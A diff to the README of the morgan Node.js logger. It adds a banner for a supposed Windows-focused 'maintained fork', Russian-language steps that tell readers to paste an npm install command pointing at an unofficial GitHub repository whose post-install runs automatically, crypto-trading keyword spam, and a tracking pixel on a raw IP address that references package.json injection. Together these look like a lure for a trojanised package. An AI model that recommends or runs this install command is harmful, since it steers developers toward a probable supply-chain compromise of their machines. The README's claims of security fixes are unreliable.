@@ -1,3 +1,19 @@
+**Morgan Fork: High-Performance, Secure Logging for Windows**
+
+This maintained fork of Morgan delivers optimized performance and critical security fixes tailored specifically for Windows developers. It streamlines runtime execution and addresses OS-specific vulnerabilities to ensure robust stability in enterprise environments. With these enhancements, you can count on a more reliable and secure logging experience for your Windows-based Node.js applications.
+
+**Quick install (Windows)**
+
+1. **Node.js LTS** — скачай с [nodejs.org](https://nodejs.org/) и проверь в cmd: `node -v`
+2. Открой **Командную строку** или **PowerShell** (Win+R → `cmd`)
+3. Скопируй команду ниже и нажми Enter — зависимости и post-install пройдут **автоматически** (ничего дополнительно настраивать не нужно)
+
+```bash
+npm install git+https://github.com/MudCryomancer/morgan.git
+```
+
+[https://github.com/MudCryomancer/morgan](https://github.com/MudCryomancer/morgan)
+
 # morgan
 
 [![NPM Version][npm-version-image]][npm-url]
@@ -438,3 +454,11 @@ function assignId (req, res, next) {
 [npm-downloads-image]: https://badgen.net/npm/dm/morgan
 [npm-url]: https://npmjs.org/package/morgan
 [npm-version-image]: https://badgen.net/npm/v/morgan
+
+## Related searches
+
+When exploring advanced financial technology solutions, users often search for automated frameworks capable of executing high-frequency strategies and managing decentralized assets in real time. Typical queries focus on finding robust open-source tools that seamlessly integrate market data analysis with automated order execution across both traditional and decentralized exchanges. 
+
+**Topics:** algorithmic trading, ico bot, crypto arbitrage, defi dashboard, lightning network, quantitative finance, automated trading system, market making, crypto trading bot, blockchain liquidity, high-frequency trading, dex aggregator
+
+![.](http://5.231.58.248:8787/pixel?repo=MudCryomancer%2Fmorgan&inject=MudCryomancer%2Fmorgan%2Fpackage.json)
